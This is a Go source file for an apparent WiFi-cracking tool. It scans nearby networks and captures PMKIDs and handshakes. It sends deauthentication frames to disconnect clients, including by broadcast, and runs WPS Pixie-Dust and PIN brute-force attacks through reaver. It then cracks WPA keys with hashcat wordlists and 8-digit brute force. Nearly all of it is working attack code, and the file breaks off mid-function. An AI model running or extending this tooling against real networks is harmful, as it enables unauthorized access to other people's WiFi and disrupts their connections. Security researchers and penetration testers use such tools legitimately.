// Package crack orchestrates WPA/WPA2/WPA3 password cracking.
//
// It wraps proven external tools (hcxdumptool, hcxpcapngtool, hashcat,
// aircrack-ng, reaver, wash) and does NOT implement any cryptographic
// operations itself.
//
// Techniques (ordered by effectiveness):
//
//  1. PMKID capture      -- client-less, extract PMKID from AP's first message (~60% of APs)
//  2. WPS Pixie-Dust     -- exploits weak RNG in WPS (~30% of WPS-enabled APs, 5-30s)
//  3. Hashcat crack      -- GPU-accelerated cracking (PMKID or handshake)
//  4. Handshake capture  -- deauth a client, capture 4-way handshake
//  5. Hashcat crack      -- GPU-accelerated cracking of handshake
//  6. WPS PIN brute      -- brute force 8-digit WPS PIN (2-10 hours, last resort)
//  7. Dictionary attack  -- wordlist-based cracking via aircrack-ng (CPU fallback)
//
// On macOS, monitor mode requires a compatible external USB WiFi adapter.
// The built-in card does not support it.
package crack

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/MikkoParkkola/nowifi/internal/toolchain"
)

// ---------------------------------------------------------------------------
// Data types
// ---------------------------------------------------------------------------

// Method represents a cracking technique.
type Method string

const (
	PMKID      Method = "pmkid_capture"
	Handshake  Method = "handshake_capture"
	Hashcat    Method = "hashcat_crack"
	Dictionary Method = "dictionary_attack"
	WPSPixie   Method = "wps_pixie_dust"
	WPSPin     Method = "wps_pin_brute"
)

// WifiTarget represents a WiFi network identified during scanning.
type WifiTarget struct {
	SSID       string   `json:"ssid"`
	BSSID      string   `json:"bssid"`
	Channel    int      `json:"channel"`
	Security   string   `json:"security"`
	Signal     int      `json:"signal"` // dBm (negative)
	Clients    []string `json:"clients,omitempty"`
	WPSEnabled bool     `json:"wps_enabled"`
	WPSLocked  bool     `json:"wps_locked"`
	WPSVersion string   `json:"wps_version,omitempty"`
}

// Result holds the outcome of a single cracking attempt.
type Result struct {
	Method      Method        `json:"method"`
	Success     bool          `json:"success"`
	Password    string        `json:"password,omitempty"`
	Details     string        `json:"details"`
	CaptureFile string        `json:"capture_file,omitempty"`
	Elapsed     time.Duration `json:"elapsed"`
}

// ---------------------------------------------------------------------------
// Capture directory
// ---------------------------------------------------------------------------

func captureDir() string {
	home, err := os.UserHomeDir()
	if err != nil {
		home = "/tmp"
	}
	return filepath.Join(home, ".nowifi", "captures")
}

func ensureCaptureDir() string {
	dir := captureDir()
	_ = os.MkdirAll(dir, 0o755)
	return dir
}

func timestampedDir(prefix string) string {
	ts := time.Now().Format("20060102_150405")
	dir := filepath.Join(ensureCaptureDir(), prefix+"_"+ts)
	_ = os.MkdirAll(dir, 0o755)
	return dir
}

// ---------------------------------------------------------------------------
// Tool discovery
// ---------------------------------------------------------------------------

func findHcxdumptool() (string, error) {
	return findTool("hcxdumptool", "brew install hcxdumptool  OR  apt install hcxdumptool")
}

func findHcxpcapngtool() (string, error) {
	return findTool("hcxpcapngtool", "brew install hcxtools  OR  apt install hcxtools")
}

func findHashcat() (string, error) {
	return findTool("hashcat", "brew install hashcat  OR  apt install hashcat")
}

func findAircrack() (string, error) {
	return findTool("aircrack-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")
}

func findAirodump() (string, error) {
	return findTool("airodump-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")
}

func findAireplay() (string, error) {
	return findTool("aireplay-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")
}

func findReaver() (string, error) {
	return findTool("reaver", "brew install reaver  OR  apt install reaver")
}

func findWash() (string, error) {
	return findTool("wash", "Installed with reaver: brew install reaver")
}

func findTool(name, installHint string) (string, error) {
	// Use toolchain.FindTool first (checks PATH, ~/.nowifi/bin, ~/bin, /usr/local/bin).
	if p := toolchain.FindTool(name); p != "" {
		return p, nil
	}
	// Check additional common locations.
	candidates := []string{
		"/opt/homebrew/bin/" + name,
	}
	for _, p := range candidates {
		if info, err := os.Stat(p); err == nil && !info.IsDir() && info.Mode()&0o111 != 0 {
			return p, nil
		}
	}
	return "", &toolchain.ToolNotFoundError{Tool: name, InstallHint: installHint}
}

// ---------------------------------------------------------------------------
// Monitor mode helpers
// ---------------------------------------------------------------------------

var bssidRE = regexp.MustCompile(`([0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}`)

func checkMonitorMode(iface string) bool {
	// Check via ifconfig.
	out, err := exec.Command("ifconfig", iface).CombinedOutput()
	if err == nil && strings.Contains(strings.ToLower(string(out)), "monitor") {
		return true
	}
	// Try iwconfig (Linux).
	out, err = exec.Command("iwconfig", iface).CombinedOutput()
	if err == nil && strings.Contains(string(out), "Mode:Monitor") {
		return true
	}
	return false
}

func isDarwin() bool {
	return runtime.GOOS == "darwin"
}

func monitorModeError(iface string) string {
	if isDarwin() {
		return "Monitor mode not available. macOS built-in WiFi does not support " +
			"monitor mode. Use an external USB WiFi adapter (e.g., Alfa AWUS036ACH)."
	}
	return fmt.Sprintf("Interface %s is not in monitor mode. Run: sudo airmon-ng start %s", iface, iface)
}

// ---------------------------------------------------------------------------
// Scanning
// ---------------------------------------------------------------------------

// ScanTargets scans for WiFi networks and identifies crackable targets.
// Uses system_profiler on macOS (passive, no monitor mode needed) and iw on Linux.
// Returns a list of WifiTarget sorted by signal strength (strongest first).
func ScanTargets(iface string, duration int) ([]WifiTarget, error) {
	var targets []WifiTarget

	if isDarwin() {
		targets = scanMacOS(iface)
	} else {
		targets = scanLinux(iface, duration)
	}

	// Sort by signal strength (strongest first, dBm is negative).
	sort.Slice(targets, func(i, j int) bool {
		return targets[i].Signal > targets[j].Signal
	})

	return targets, nil
}

// scanMacOS scans using system_profiler SPAirPortDataType on macOS.
func scanMacOS(_ string) []WifiTarget {
	var targets []WifiTarget

	out, err := exec.Command("system_profiler", "SPAirPortDataType", "-json").Output()
	if err == nil {
		targets = parseMacOSSystemProfiler(out)
	}

	// Fallback: airport utility.
	if len(targets) == 0 {
		targets = scanMacOSAirport()
	}

	return targets
}

// parseMacOSSystemProfiler parses the JSON output from system_profiler SPAirPortDataType.
func parseMacOSSystemProfiler(data []byte) []WifiTarget {
	var targets []WifiTarget

	var raw map[string]json.RawMessage
	if err := json.Unmarshal(data, &raw); err != nil {
		return nil
	}

	spData, ok := raw["SPAirPortDataType"]
	if !ok {
		return nil
	}

	var items []map[string]json.RawMessage
	if err := json.Unmarshal(spData, &items); err != nil {
		return nil
	}

	for _, item := range items {
		ifacesRaw, ok := item["spairport_airport_interfaces"]
		if !ok {
			continue
		}
		var ifaces []map[string]json.RawMessage
		if err := json.Unmarshal(ifacesRaw, &ifaces); err != nil {
			continue
		}

		for _, iface := range ifaces {
			// Parse other visible networks.
			if netsRaw, ok := iface["spairport_airport_other_local_wireless_networks"]; ok {
				var networks []map[string]interface{}
				if err := json.Unmarshal(netsRaw, &networks); err == nil {
					for _, net := range networks {
						if t := parseMacOSNetwork(net); t != nil {
							targets = append(targets, *t)
						}
					}
				}
			}

			// Parse currently connected network.
			if currentRaw, ok := iface["spairport_current_network_information"]; ok {
				var current map[string]interface{}
				if err := json.Unmarshal(currentRaw, &current); err == nil {
					if t := parseMacOSNetwork(current); t != nil {
						targets = append(targets, *t)
					}
				}
			}
		}
	}

	return targets
}

// parseMacOSNetwork extracts a WifiTarget from a system_profiler network entry.
func parseMacOSNetwork(net map[string]interface{}) *WifiTarget {
	ssid, _ := net["_name"].(string)
	if ssid == "" {
		return nil
	}

	bssid, _ := net["spairport_network_bssid"].(string)
	channelStr := fmt.Sprintf("%v", net["spairport_network_channel"])
	channel := parseChannelNumber(channelStr)
	security, _ := net["spairport_security_mode"].(string)
	if security == "" {
		security = "unknown"
	}

	signal := -99
	if signalRaw, ok := net["spairport_signal_noise"]; ok {
		s := fmt.Sprintf("%v", signalRaw)
		parts := strings.Fields(s)
		if len(parts) > 0 {
			if v, err := strconv.Atoi(parts[0]); err == nil {
				signal = v
			}
		}
	}

	return &WifiTarget{
		SSID:     ssid,
		BSSID:    bssid,
		Channel:  channel,
		Security: security,
		Signal:   signal,
	}
}

// parseChannelNumber extracts the numeric channel from a string like "6" or "6, 40MHz".
func parseChannelNumber(s string) int {
	re := regexp.MustCompile(`(\d+)`)
	m := re.FindString(s)
	if m == "" {
		return 0
	}
	v, _ := strconv.Atoi(m)
	return v
}

// scanMacOSAirport scans using the airport utility on macOS.
func scanMacOSAirport() []WifiTarget {
	var targets []WifiTarget
	const airportPath = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

	out, err := exec.Command(airportPath, "-s").Output()
	if err != nil {
		return nil
	}

	lines := strings.Split(string(out), "\n")
	for _, line := range lines[1:] { // Skip header.
		if strings.TrimSpace(line) == "" {
			continue
		}

		loc := bssidRE.FindStringIndex(line)
		if loc == nil {
			continue
		}

		bssid := line[loc[0]:loc[1]]
		ssid := strings.TrimSpace(line[:loc[0]])
		remainder := strings.Fields(strings.TrimSpace(line[loc[1]:]))

		if len(remainder) < 4 {
			continue
		}

		rssi, err1 := strconv.Atoi(remainder[0])
		channel, err2 := strconv.Atoi(remainder[1])
		if err1 != nil || err2 != nil {
			continue
		}

		security := "unknown"
		if len(remainder) > 3 {
			security = strings.Join(remainder[3:], " ")
		}

		targets = append(targets, WifiTarget{
			SSID:     ssid,
			BSSID:    bssid,
			Channel:  channel,
			Security: security,
			Signal:   rssi,
		})
	}

	return targets
}

// scanLinux scans using iw on Linux.
func scanLinux(iface string, duration int) []WifiTarget {
	var targets []WifiTarget

	// Trigger a scan.
	timeout := time.Duration(duration+10) * time.Second
	cmd := exec.Command("sudo", "iw", "dev", iface, "scan")
	cmd.WaitDelay = timeout
	_ = cmd.Run()

	// Parse scan results.
	cmd2 := exec.Command("sudo", "iw", "dev", iface, "scan", "dump")
	cmd2.WaitDelay = 10 * time.Second
	out, err := cmd2.Output()
	if err != nil {
		return nil
	}

	type entry struct {
		bssid    string
		ssid     string
		channel  int
		signal   int
		security string
	}

	var current *entry

	flush := func() {
		if current != nil && current.bssid != "" {
			sec := current.security
			if sec == "" {
				sec = "unknown"
			}
			targets = append(targets, WifiTarget{
				SSID:     current.ssid,
				BSSID:    current.bssid,
				Channel:  current.channel,
				Security: sec,
				Signal:   current.signal,
			})
		}
	}

	for _, line := range strings.Split(string(out), "\n") {
		trimmed := strings.TrimSpace(line)

		if strings.HasPrefix(trimmed, "BSS ") {
			flush()
			m := bssidRE.FindString(trimmed)
			current = &entry{bssid: m, signal: -99}
		} else if current == nil {
			continue
		} else if strings.HasPrefix(trimmed, "SSID:") {
			current.ssid = strings.TrimSpace(trimmed[5:])
		} else if strings.HasPrefix(trimmed, "signal:") {
			parts := strings.Fields(strings.TrimPrefix(trimmed, "signal:"))
			if len(parts) > 0 {
				if v, err := strconv.ParseFloat(parts[0], 64); err == nil {
					current.signal = int(v)
				}
			}
		} else if strings.HasPrefix(trimmed, "DS Parameter set: channel") {
			parts := strings.Fields(trimmed)
			if len(parts) > 0 {
				if v, err := strconv.Atoi(parts[len(parts)-1]); err == nil {
					current.channel = v
				}
			}
		} else if strings.Contains(trimmed, "WPA") || strings.Contains(trimmed, "RSN") {
			if strings.Contains(trimmed, "RSN") {
				current.security = "WPA2"
			} else {
				current.security = "WPA"
			}
		}
	}
	flush()

	return targets
}

// ---------------------------------------------------------------------------
// PMKID capture
// ---------------------------------------------------------------------------

// CapturePMKID captures a PMKID from the target AP using hcxdumptool.
//
// PMKID is extracted from the AP's first EAPOL message during association.
// Does NOT require any connected clients. Approximately 60% of APs are vulnerable.
func CapturePMKID(target WifiTarget, iface string, timeout time.Duration) (*Result, error) {
	start := time.Now()
	result := &Result{Method: PMKID, Success: false}

	outputDir := timestampedDir("pmkid")

	if !checkMonitorMode(iface) {
		result.Details = monitorModeError(iface)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	hcxdumptool, err := findHcxdumptool()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	hcxpcapngtool, err := findHcxpcapngtool()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Write filterlist (target BSSID without colons).
	filterlist := filepath.Join(outputDir, "filterlist.txt")
	bssidClean := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(target.BSSID, ":", ""), "-", ""))
	if err := os.WriteFile(filterlist, []byte(bssidClean+"\n"), 0o644); err != nil {
		return nil, fmt.Errorf("write filterlist: %w", err)
	}

	captureFile := filepath.Join(outputDir, "capture.pcapng")

	cmd := exec.Command(
		hcxdumptool,
		"-i", iface,
		"-o", captureFile,
		"--filterlist_ap="+filterlist,
		"--filtermode=2",
		"--enable_status=1",
	)

	if err := cmd.Start(); err != nil {
		result.Details = fmt.Sprintf("failed to start hcxdumptool: %v", err)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Wait for capture or timeout.
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	select {
	case <-done:
		// Process exited on its own.
	case <-time.After(timeout):
		_ = cmd.Process.Signal(os.Interrupt)
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			_ = cmd.Process.Kill()
			<-done
		}
	}

	// Check capture file.
	info, err := os.Stat(captureFile)
	if err != nil || info.Size() == 0 {
		result.Details = fmt.Sprintf("No PMKID captured within %v", timeout)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Convert pcapng to hashcat format.
	hashFile := filepath.Join(outputDir, "hash.22000")
	convCmd := exec.Command(hcxpcapngtool, "-o", hashFile, captureFile)
	_ = convCmd.Run()

	hInfo, err := os.Stat(hashFile)
	if err != nil || hInfo.Size() == 0 {
		result.Details = "Captured traffic but no PMKID extracted"
		result.CaptureFile = captureFile
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Count PMKIDs extracted.
	pmkidCount := countFileLines(hashFile)

	result.Success = true
	result.CaptureFile = hashFile
	result.Details = fmt.Sprintf("Captured %d PMKID(s) from %s (%s)", pmkidCount, target.SSID, target.BSSID)
	result.Elapsed = time.Since(start)
	return result, nil
}

// ---------------------------------------------------------------------------
// Handshake capture
// ---------------------------------------------------------------------------

// CaptureHandshake captures a WPA 4-way handshake by deauthing a client.
//
// Requires at least one client connected to the target AP. Sends deauth
// frames to disconnect a client, then captures the handshake on reconnect.
func CaptureHandshake(target WifiTarget, iface string, timeout time.Duration) (*Result, error) {
	start := time.Now()
	result := &Result{Method: Handshake, Success: false}

	outputDir := timestampedDir("handshake")

	if !checkMonitorMode(iface) {
		result.Details = monitorModeError(iface)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Prefer hcxdumptool (handles deauth + capture in one tool).
	hcxResult, hcxErr := captureHandshakeHcx(target, iface, outputDir, timeout, start)
	if hcxErr == nil {
		return hcxResult, nil
	}

	// Fallback: airodump-ng + aireplay-ng.
	airResult, airErr := captureHandshakeAircrack(target, iface, outputDir, timeout, start)
	if airErr == nil {
		return airResult, nil
	}

	result.Details = fmt.Sprintf("No capture tools available. %v", airErr)
	result.Elapsed = time.Since(start)
	return result, nil
}

// captureHandshakeHcx captures handshake using hcxdumptool.
func captureHandshakeHcx(target WifiTarget, iface, outputDir string, timeout time.Duration, start time.Time) (*Result, error) {
	hcxdumptool, err := findHcxdumptool()
	if err != nil {
		return nil, err
	}
	hcxpcapngtool, err := findHcxpcapngtool()
	if err != nil {
		return nil, err
	}

	result := &Result{Method: Handshake, Success: false}

	filterlist := filepath.Join(outputDir, "filterlist.txt")
	bssidClean := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(target.BSSID, ":", ""), "-", ""))
	if err := os.WriteFile(filterlist, []byte(bssidClean+"\n"), 0o644); err != nil {
		return nil, fmt.Errorf("write filterlist: %w", err)
	}

	captureFile := filepath.Join(outputDir, "capture.pcapng")

	cmd := exec.Command(
		hcxdumptool,
		"-i", iface,
		"-o", captureFile,
		"--filterlist_ap="+filterlist,
		"--filtermode=2",
		"--enable_status=1",
		"--active_beacon",
		"--deauthentication",
	)

	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("start hcxdumptool: %w", err)
	}

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	select {
	case <-done:
	case <-time.After(timeout):
		_ = cmd.Process.Signal(os.Interrupt)
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			_ = cmd.Process.Kill()
			<-done
		}
	}

	info, err := os.Stat(captureFile)
	if err != nil || info.Size() == 0 {
		result.Details = fmt.Sprintf("No handshake captured within %v", timeout)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Convert to hashcat format.
	hashFile := filepath.Join(outputDir, "hash.22000")
	_ = exec.Command(hcxpcapngtool, "-o", hashFile, captureFile).Run()

	hInfo, err := os.Stat(hashFile)
	if err != nil || hInfo.Size() == 0 {
		result.Details = "Captured traffic but no valid handshake extracted"
		result.CaptureFile = captureFile
		result.Elapsed = time.Since(start)
		return result, nil
	}

	hashCount := countFileLines(hashFile)

	result.Success = true
	result.CaptureFile = hashFile
	result.Details = fmt.Sprintf("Captured %d handshake(s) from %s (%s)", hashCount, target.SSID, target.BSSID)
	result.Elapsed = time.Since(start)
	return result, nil
}

// captureHandshakeAircrack captures handshake using airodump-ng + aireplay-ng.
func captureHandshakeAircrack(target WifiTarget, iface, outputDir string, timeout time.Duration, start time.Time) (*Result, error) {
	airodump, err := findAirodump()
	if err != nil {
		return nil, err
	}
	aireplay, err := findAireplay()
	if err != nil {
		return nil, err
	}

	result := &Result{Method: Handshake, Success: false}

	capturePrefix := filepath.Join(outputDir, "capture")

	// Start airodump-ng to capture traffic on the target channel.
	airodumpCmd := exec.Command(
		airodump,
		"-c", strconv.Itoa(target.Channel),
		"--bssid", target.BSSID,
		"-w", capturePrefix,
		"--output-format", "pcap",
		iface,
	)
	if err := airodumpCmd.Start(); err != nil {
		return nil, fmt.Errorf("start airodump-ng: %w", err)
	}

	// Give airodump time to start capturing.
	time.Sleep(3 * time.Second)

	// Send deauth to a client (or broadcast if none known).
	deauthTarget := "FF:FF:FF:FF:FF:FF"
	if len(target.Clients) > 0 {
		deauthTarget = target.Clients[0]
	}

	deauthCmd := exec.Command(
		aireplay,
		"--deauth", "5",
		"-a", target.BSSID,
		"-c", deauthTarget,
		iface,
	)
	_ = deauthCmd.Run()

	// Wait for handshake.
	remaining := timeout - time.Since(start)
	if remaining < time.Second {
		remaining = time.Second
	}

	done := make(chan error, 1)
	go func() { done <- airodumpCmd.Wait() }()

	select {
	case <-done:
	case <-time.After(remaining):
		_ = airodumpCmd.Process.Signal(os.Interrupt)
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			_ = airodumpCmd.Process.Kill()
			<-done
		}
	}

	// Look for the capture file (airodump adds -01.cap suffix).
	var capFile string
	for _, suffix := range []string{"-01.cap", "-01.pcap", "-01.pcapng"} {
		candidate := capturePrefix + suffix
		if info, err := os.Stat(candidate); err == nil && info.Size() > 0 {
			capFile = candidate
			break
		}
	}

	if capFile == "" {
		result.Details = "No capture file produced by airodump-ng"
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Try to convert to hashcat format if hcxpcapngtool is available.
	if hcxpcapngtool, err := findHcxpcapngtool(); err == nil {
		hashFile := filepath.Join(outputDir, "hash.22000")
		_ = exec.Command(hcxpcapngtool, "-o", hashFile, capFile).Run()

		if info, err := os.Stat(hashFile); err == nil && info.Size() > 0 {
			result.Success = true
			result.CaptureFile = hashFile
			result.Details = fmt.Sprintf("Handshake captured from %s (%s)", target.SSID, target.BSSID)
			result.Elapsed = time.Since(start)
			return result, nil
		}
	}

	// Fall back to raw cap file (can be used with aircrack-ng directly).
	result.Success = true
	result.CaptureFile = capFile
	result.Details = fmt.Sprintf("Handshake captured (raw pcap) from %s (%s)", target.SSID, target.BSSID)
	result.Elapsed = time.Since(start)
	return result, nil
}

// ---------------------------------------------------------------------------
// WPS scanning and attacks
// ---------------------------------------------------------------------------

// ScanWPSTargets scans for WPS-enabled access points using wash or reaver --wash.
func ScanWPSTargets(iface string, timeout time.Duration) []WifiTarget {
	// Try wash first (preferred, part of reaver package).
	if washPath, err := findWash(); err == nil {
		out := runWithTimeout(washPath, []string{"-i", iface, "-s"}, timeout)
		if targets := parseWashOutput(out); len(targets) > 0 {
			return targets
		}
	}

	// Fallback: reaver with --wash flag.
	if reaverPath, err := findReaver(); err == nil {
		out := runWithTimeout(reaverPath, []string{"-i", iface, "--wash"}, timeout)
		return parseWashOutput(out)
	}

	return nil
}

// parseWashOutput parses wash/reaver --wash output into WifiTarget list.
//
// Typical wash output format:
//
//	BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
//	AA:BB:CC:DD:EE:FF    6  -45  1.0  No   RalinkTe  MyNetwork
func parseWashOutput(output string) []WifiTarget {
	var targets []WifiTarget

	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "BSSID") || strings.HasPrefix(line, "---") {
			continue
		}

		loc := bssidRE.FindStringIndex(line)
		if loc == nil || loc[0] != 0 {
			continue
		}

		bssid := line[loc[0]:loc[1]]
		remainder := strings.Fields(strings.TrimSpace(line[loc[1]:]))

		if len(remainder) < 5 {
			continue
		}

		channel, err1 := strconv.Atoi(remainder[0])
		signal, err2 := strconv.Atoi(remainder[1])
		if err1 != nil || err2 != nil {
			continue
		}

		wpsVersion := ""
		if len(remainder) > 2 {
			wpsVersion = remainder[2]
		}
		wpsLocked := false
		if len(remainder) > 3 {
			wpsLocked = strings.EqualFold(remainder[3], "yes")
		}
		essid := ""
		if len(remainder) > 5 {
			essid = strings.Join(remainder[5:], " ")
		}

		targets = append(targets, WifiTarget{
			SSID:       essid,
			BSSID:      bssid,
			Channel:    channel,
			Security:   "WPA/WPA2",
			Signal:     signal,
			WPSEnabled: true,
			WPSLocked:  wpsLocked,
			WPSVersion: wpsVersion,
		})
	}

	return targets
}

// CrackWPSPixie performs a WPS Pixie-Dust attack using reaver.
//
// Exploits weak random number generation in WPS implementations.
// Takes 5-30 seconds when vulnerable. Approximately 30% of WPS-enabled APs are vulnerable.
func CrackWPSPixie(target WifiTarget, iface string, timeout time.Duration) (*Result, error) {
	start := time.Now()
	result := &Result{Method: WPSPixie, Success: false}

	outputDir := timestampedDir("wps_pixie")

	if !checkMonitorMode(iface) {
		result.Details = monitorModeError(iface)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	reaverPath, err := findReaver()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	if target.WPSLocked {
		result.Details = fmt.Sprintf("WPS is locked on %s (%s) -- skipping Pixie-Dust", target.SSID, target.BSSID)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	cmd := exec.Command(
		reaverPath,
		"-i", iface,
		"-b", target.BSSID,
		"-c", strconv.Itoa(target.Channel),
		"-K", "1", // Pixie-Dust attack
		"-vv",
	)

	outputFile := filepath.Join(outputDir, "reaver_pixie.log")
	stdoutText := runCmdWithTimeout(cmd, timeout)

	// Save log.
	_ = os.WriteFile(outputFile, []byte(stdoutText), 0o644)

	// Parse reaver output for WPS PIN and WPA PSK.
	wpsPin, wpaPSK := parseReaverOutput(stdoutText)

	if wpaPSK != "" {
		result.Success = true
		result.Password = wpaPSK
		result.Details = fmt.Sprintf("Pixie-Dust recovered WPA PSK from %s (WPS PIN: %s)", target.SSID, wpsPin)
		result.CaptureFile = outputFile
	} else if wpsPin != "" {
		result.Success = true
		result.Details = fmt.Sprintf("Pixie-Dust recovered WPS PIN: %s (but no PSK in output)", wpsPin)
		result.CaptureFile = outputFile
	} else {
		if strings.Contains(stdoutText, "WPS transaction failed") {
			result.Details = "WPS transaction failed -- AP may have rate limiting"
		} else if strings.Contains(stdoutText, "WPS pin not found") || strings.Contains(stdoutText, "Failed to recover") {
			result.Details = "Pixie-Dust failed -- AP not vulnerable to weak RNG attack"
		} else {
			tail := stdoutText
			if len(tail) > 200 {
				tail = tail[len(tail)-200:]
			}
			result.Details = fmt.Sprintf("Pixie-Dust did not recover credentials. %s", tail)
		}
	}

	result.Elapsed = time.Since(start)
	return result, nil
}

// CrackWPSPin performs a WPS PIN brute force attack using reaver.
//
// Brute forces the 8-digit WPS PIN (effectively 11000 combinations due to
// checksum digit + split verification). Can take 2-10 hours. Last resort.
func CrackWPSPin(target WifiTarget, iface string, timeout time.Duration) (*Result, error) {
	start := time.Now()
	result := &Result{Method: WPSPin, Success: false}

	outputDir := timestampedDir("wps_pin")

	if !checkMonitorMode(iface) {
		result.Details = monitorModeError(iface)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	reaverPath, err := findReaver()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	if target.WPSLocked {
		result.Details = fmt.Sprintf("WPS is locked on %s (%s) -- PIN brute force blocked", target.SSID, target.BSSID)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	cmd := exec.Command(
		reaverPath,
		"-i", iface,
		"-b", target.BSSID,
		"-c", strconv.Itoa(target.Channel),
		"-vv",
		"-d", "2", // 2 second delay between PINs (avoid lockout)
		"-N",       // Don't send NACK packets (more reliable)
	)

	outputFile := filepath.Join(outputDir, "reaver_pin.log")
	stdoutText := runCmdWithTimeout(cmd, timeout)

	// Save log.
	_ = os.WriteFile(outputFile, []byte(stdoutText), 0o644)

	wpsPin, wpaPSK := parseReaverOutput(stdoutText)

	if wpaPSK != "" {
		result.Success = true
		result.Password = wpaPSK
		result.Details = fmt.Sprintf("WPS PIN brute force recovered PSK from %s (PIN: %s)", target.SSID, wpsPin)
		result.CaptureFile = outputFile
	} else if wpsPin != "" {
		result.Success = true
		result.Details = fmt.Sprintf("WPS PIN recovered: %s (but no PSK in output)", wpsPin)
		result.CaptureFile = outputFile
	} else {
		if strings.Contains(stdoutText, "WPS pin not found") {
			result.Details = "WPS PIN brute force exhausted all PINs without success"
		} else if strings.Contains(strings.ToLower(stdoutText), "locked") {
			result.Details = "AP locked WPS after too many attempts"
		} else {
			result.Details = fmt.Sprintf("WPS PIN brute force timed out after %v", timeout)
		}
	}

	result.Elapsed = time.Since(start)
	return result, nil
}

// parseReaverOutput parses reaver stdout for WPS PIN and WPA PSK.
//
// Reaver prints:
//
//	[+] WPS PIN: '12345670'
//	[+] WPA PSK: 'MyPassword123'
func parseReaverOutput(output string) (wpsPin, wpaPSK string) {
	pinRE := regexp.MustCompile(`WPS PIN:\s*'?([0-9]{4,8})'?`)
	pskRE := regexp.MustCompile(`WPA PSK:\s*'(.+?)'`)

	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)

		if m := pinRE.FindStringSubmatch(line); len(m) > 1 {
			wpsPin = m[1]
		}

		if m := pskRE.FindStringSubmatch(line); len(m) > 1 {
			wpaPSK = m[1]
		} else if strings.Contains(line, "WPA PSK:") {
			// Unquoted PSK.
			parts := strings.SplitN(line, "WPA PSK:", 2)
			if len(parts) == 2 {
				psk := strings.TrimSpace(parts[1])
				if psk != "" {
					wpaPSK = psk
				}
			}
		}
	}

	return wpsPin, wpaPSK
}

// ---------------------------------------------------------------------------
// Hashcat cracking
// ---------------------------------------------------------------------------

// CrackWithHashcat cracks a captured hash with hashcat (GPU-accelerated).
//
// attackMode: "dictionary" (mode 0), "brute" (mode 3), or "rule" (mode 0 + rules).
// wordlist: path to wordlist file. Auto-detected if empty.
func CrackWithHashcat(hashFile string, wordlist string) (*Result, error) {
	return crackWithHashcatMode(hashFile, "dictionary", wordlist)
}

// crackWithHashcatMode runs hashcat with a specific attack mode.
func crackWithHashcatMode(hashFile, attackMode, wordlist string) (*Result, error) {
	start := time.Now()
	result := &Result{Method: Hashcat, Success: false}

	if _, err := os.Stat(hashFile); os.IsNotExist(err) {
		result.Details = fmt.Sprintf("Hash file not found: %s", hashFile)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	hashcatPath, err := findHashcat()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Mode 22000 handles both PMKID and handshake hashes (WPA-PBKDF2-PMKID+EAPOL).
	args := []string{"-m", "22000"}

	switch attackMode {
	case "brute":
		// Brute force: try 8-digit numeric passwords (very common for ISP defaults).
		args = append(args, "-a", "3", hashFile, "?d?d?d?d?d?d?d?d")
	case "rule":
		if wordlist == "" {
			wordlists := FindWordlists()
			if len(wordlists) == 0 {
				result.Details = "No wordlist found. Specify --wordlist or install rockyou.txt"
				result.Elapsed = time.Since(start)
				return result, nil
			}
			wordlist = wordlists[0]
		}
		rules := findHashcatRules(hashcatPath)
		args = append(args, "-a", "0", "-r", rules, hashFile, wordlist)
	default:
		// Dictionary mode (default).
		if wordlist == "" {
			wordlists := FindWordlists()
			if len(wordlists) == 0 {
				result.Details = "No wordlist found. Specify --wordlist or install rockyou.txt"
				result.Elapsed = time.Since(start)
				return result, nil
			}
			wordlist = wordlists[0]
		}
		args = append(args, "-a", "0", hashFile, wordlist)
	}

	// Common hashcat options.
	args = append(args,
		"--potfile-disable",
		"--status",
		"--status-timer=10",
		"-O",       // Optimized kernels
		"--quiet",  // Suppress banner
	)

	if isDarwin() {
		args = append(args, "--backend-devices=1") // Metal backend
	}

	cmd := exec.Command(hashcatPath, args...)
	out, _ := cmd.CombinedOutput()
	stdoutText := string(out)

	// Parse hashcat output for cracked password.
	password := parseHashcatOutput(stdoutText)

	if password != "" {
		result.Success = true
		result.Password = password
		result.Details = fmt.Sprintf("Password cracked: %s", password)
	} else {
		exitCode := cmd.ProcessState.ExitCode()
		if exitCode == 1 {
			result.Details = "Hashcat exhausted wordlist -- password not found"
		} else if exitCode == 0 {
			result.Details = "Hashcat completed but no password parsed from output"
		} else {
			tail := stdoutText
			if len(tail) > 200 {
				tail = tail[len(tail)-200:]
			}
